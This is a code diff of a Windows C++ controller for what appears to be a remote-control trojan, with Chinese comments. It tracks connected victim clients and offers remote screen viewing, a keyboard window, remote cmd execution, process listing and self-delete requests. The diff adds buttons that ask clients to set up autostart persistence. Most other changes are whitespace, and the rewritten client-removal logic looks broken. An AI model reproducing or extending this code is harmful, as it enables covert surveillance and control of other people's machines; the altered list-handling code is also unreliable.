@@ -171,7 +171,7 @@ BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 		break;
 	case WM_INITDIALOG:
 		hWinMain = hWnd;
-		
+
 		hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
 		SendMessage(hWnd, WM_SETICON, ICON_BIG, LPARAM(hIcon));
 
@@ -267,14 +267,14 @@ BOOL _stdcall _ReceiveClient()
 		memset(&remoteAddr, 0, sizeof(remoteAddr));
 		remoteAddr.sin_family = AF_INET;
 		SOCKET h = accept(hSocketWait, (sockaddr*)&remoteAddr, &nLen);				//等待客户端连接
-		
-		
+
+
 
 		i = 1;												//增加一个客户端数据结构
 		pClient = pHandClient;
-		if (pHandClient == NULL)							
+		if (pHandClient == NULL)
 		{
-			pHandClient = new ClientData( );
+			pHandClient = new ClientData();
 			pClient = pHandClient;
 			pClient->Next = NULL;
 			i = 0;
@@ -286,8 +286,8 @@ BOOL _stdcall _ReceiveClient()
 				pClient = pClient->Next;
 				i++;
 			}
-			
-			pClient->Next = new ClientData( );
+
+			pClient->Next = new ClientData();
 			pClient = pClient->Next;
 			pClient->Next = NULL;
 		}
@@ -325,17 +325,18 @@ BOOL _stdcall _ReceiveClient()
 
 
 //循环收取来自客户端的数据包
-BOOL _stdcall _ToClient(_Show * lpScreen)
+BOOL _stdcall _ToClient(_Show* lpScreen)
 {
 	BYTE szBuffer[256];
 	BYTE* lpBuf;
 	int len;
 	int len1;
 	int flag = 0;				//用来结束线程
+	DWORD	dwItem;
 
 	MyWrap	stSendWrap;			//请求包
-	ClientData* pClient		 = pHandClient;		//辅助指针
-	ClientData* pClientFront			;		//辅助指针
+	ClientData* pClient = pHandClient;		//辅助指针
+	ClientData* pClientFront;		//辅助指针
 	for (int i = 0;i < lpScreen->dwItem; i++)
 	{
 		pClient = pClient->Next;
@@ -346,7 +347,7 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 
 
 
-	
+
 
 	while (1)
 	{
@@ -360,8 +361,8 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 		memset(szBuffer, 0, sizeof(szBuffer));
 		while (1)
 		{
-			
-			
+
+
 			len = recv(pClient->hSocketClient, (char*)(szBuffer + len), 8 - len, 0);
 			if (len <= 0)							//recv错误
 			{
@@ -371,7 +372,7 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 			if (len == 8)
 				break;
 		}
-		
+
 		if (flag == 1)		//如果recv出错,断开连接结束线程
 		{
 			SendMessage(pClient->hScreenWindow, WM_CLOSE, 0, 0);								//关闭屏幕显示窗口和线程
@@ -379,12 +380,23 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 			SendMessage(pClient->hKeyWindow, WM_CLOSE, 0, 0);									//关闭键盘窗口
 
 																							//删除客户端数据链中相应的客户端
-			pClient = pHandClient;
-			if (lpScreen->dwItem == 0)
-				pHandClient = NULL;
+			dwItem = 0;
+			pClientFront = pHandClient;
+			while (pClient != NULL)
+			{
+				if (pClientFront->hThread == pClient->hThread)
+					break;
+				pClient = pClient->Next;
+				dwItem++;
+
+			}
+
+
+			if (dwItem == 0)
+				pHandClient = pHandClient->Next;
 			else
 			{
-				for (int i = 0;i < lpScreen->dwItem; i++)
+				for (int i = 0;i < dwItem; i++)
 				{
 					pClientFront = pClient;
 					pClient = pClient->Next;
@@ -394,14 +406,14 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 			}
 			delete pClient;
 
-											
-			ListView_DeleteItem(GetDlgItem(hWinMain, IDC_LIST1), pClient->stShow.dwItem);		//删除对应UI中的连接
+
+			ListView_DeleteItem(GetDlgItem(hWinMain, IDC_LIST1), dwItem);		//删除对应UI中的连接
 			break;																				//退出线程
 		}
 		pClient->stWrap.dwType = szBuffer[0] + szBuffer[1] * 0x100 + szBuffer[2] * 0x10000 + szBuffer[3] * 0x1000000;
 		pClient->stWrap.dwLength = szBuffer[4] + szBuffer[5] * 0x100 + szBuffer[6] * 0x10000 + szBuffer[7] * 0x1000000;
-		pClient->stWrap.lpBuffer = new BYTE[pClient->stWrap.dwLength + 1]( );
-		
+		pClient->stWrap.lpBuffer = new BYTE[pClient->stWrap.dwLength + 1]();
+
 		memset(szBuffer, 0, sizeof(szBuffer));
 		len = 0;
 		len1 = 0;
@@ -416,7 +428,7 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 		ReleaseMutex(pClient->hmutex);						//释放互斥对象
 		ReleaseMutex(pClient->hmutex);						//释放互斥对象
 		WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
-		
+
 
 
 
@@ -462,14 +474,14 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 //显示屏幕窗口(窗口回调)
 BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
-	
+
 	ClientData* pClient = pHandClient;		//辅助指针
-	
+
 	switch (message)
 	{
 	case WM_CLOSE:										//关闭显示屏幕线程
 		pClient = pHandClient;
-		while (pClient!= NULL)
+		while (pClient != NULL)
 		{
 			if (pClient->hScreenWindow == hWnd)
 			{
@@ -479,10 +491,10 @@ BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lPara
 			pClient = pClient->Next;
 		}
 		EndDialog(hWnd, 0);
-		
+
 		break;
 	case WM_INITDIALOG:
-		
+
 		for (int i = 0;i < lParam; i++)		//保存对应屏幕窗口信息
 			pClient = pClient->Next;
 
@@ -491,7 +503,7 @@ BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lPara
 
 		pClient->hScreenThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ShowScreen, &pClient->stShow, 0, NULL);
 		pClient->hScreenWindow = hWnd;
-		
+
 		break;
 	default:
 		return FALSE;
@@ -513,7 +525,7 @@ BOOL CALLBACK _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 
 	ClientData* pClient = pHandClient;		//辅助指针
 	MyWrap	stSendWrap;			//请求包
-	char	szBuffer[256] ;
+	char	szBuffer[256];
 
 	switch (message)
 	{
@@ -531,7 +543,7 @@ BOOL CALLBACK _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 					stSendWrap.dwType = GET_CLIENT_CMD;
 					stSendWrap.dwLength = lstrlen(szBuffer);
 					WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
-					send(pClient->hSocketClient, (char*)&stSendWrap, 8,0);				//请求执行cmd
+					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求执行cmd
 					send(pClient->hSocketClient, szBuffer, stSendWrap.dwLength, 0);
 					ReleaseMutex(hmutex1);						//释放互斥对象1
 
@@ -566,7 +578,7 @@ BOOL CALLBACK _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 	case WM_OWN_SHOWPROCESS:
 		_ShowProcess(hWnd);
 		break;
-	case WM_CLOSE:										
+	case WM_CLOSE:
 		EndDialog(hWnd, 0);
 		break;
 	case WM_INITDIALOG:
@@ -690,6 +702,24 @@ BOOL CALLBACK _DialogOther(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam
 			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求重启自删除
 			ReleaseMutex(hmutex1);						//释放互斥对象1
 			break;
+		case IDC_BUTTON3:
+			stSendWrap.dwType = 90001;
+			stSendWrap.dwLength = 0;
+
+			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
+			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求重启自启动
+			ReleaseMutex(hmutex1);						//释放互斥对象1
+			break;
+		case IDC_BUTTON4:
+			stSendWrap.dwType = 90002;
+			stSendWrap.dwLength = 0;
+
+			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
+			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求重启自启动
+			ReleaseMutex(hmutex1);						//释放互斥对象1
+		
+			break;
+
 		}
 		break;
 	case WM_CLOSE:										//关闭显示屏幕线程
@@ -699,9 +729,9 @@ BOOL CALLBACK _DialogOther(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam
 		for (int i = 0;i < lParam; i++)		//保存对应屏幕窗口信息
 			pClient = pClient->Next;
 
-		pClient->stShow.hWnd	= hWnd;
-		pClient->stShow.dwItem	= lParam;
-		pClient->hKeyWindow		= hWnd;
+		pClient->stShow.hWnd = hWnd;
+		pClient->stShow.dwItem = lParam;
+		pClient->hKeyWindow = hWnd;
 		break;
 	default:
 		return FALSE;
@@ -731,7 +761,7 @@ BOOL _stdcall _ShowScreen(_Show* lpScreen)
 	{
 		pClient = pClient->Next;
 	}
-	
+
 	MyWrap	stSendWrap;			//请求包
 	stSendWrap.dwType = GET_CLIENT_SCREEN;
 	stSendWrap.dwLength = 0;
@@ -746,8 +776,8 @@ BOOL _stdcall _ShowScreen(_Show* lpScreen)
 
 	while (1)
 	{
-		
-		
+
+
 		if (pClient->stWrap.dwType == TO_CLIENT_SCREEN)			//显示屏幕包
 		{
 
@@ -812,7 +842,7 @@ BOOL _stdcall _ShowProcess(HWND hWnd)
 	DWORD  dwPid;
 	char	szBuffer[256];
 	LVITEM lvItem;				//行属性
-	
+
 	memset(&lvItem, 0, sizeof(lvItem));
 	ClientData* pClient = pHandClient;		//辅助指针
 	while (pClient != NULL)
@@ -839,7 +869,7 @@ BOOL _stdcall _ShowProcess(HWND hWnd)
 				x = x + lstrlen((LPCSTR)((((BYTE*)pClient->stWrap.lpBuffer)) + x));
 				x++;
 				dwPid = *((DWORD*)(((BYTE*)pClient->stWrap.lpBuffer) + x));
-				
+
 				wsprintf(szBuffer, TEXT("%d"), dwPid);
 				lvItem.iSubItem = 1;
 				lvItem.pszText = szBuffer;
@@ -850,7 +880,7 @@ BOOL _stdcall _ShowProcess(HWND hWnd)
 				i++;
 
 			}
-			
+
 
 			break;
 		}
